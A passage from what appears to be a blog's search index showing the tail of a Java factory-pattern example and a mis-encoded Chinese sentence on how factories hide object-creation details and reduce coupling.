class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Apple</span> <span class="hljs-variable">fruit</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleFactora</span>().getFruit();<br>        System.out.println(fruit);<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>â€‹å±è”½äº†å¯¹è±¡çš„åˆ›å»ºç»†èŠ‚ï¼Œä½¿ç”¨è€…åªéœ€è¦å…³å¿ƒå¦‚ä½•ä½¿ç”¨å¯¹è±¡ï¼Œé™ä½äº†å®¢æˆ·ç«¯ä¸å¯¹è±¡ä¹‹é—´çš„è€¦åˆåº¦ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAè®¾è®¡æ¨¡å¼</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
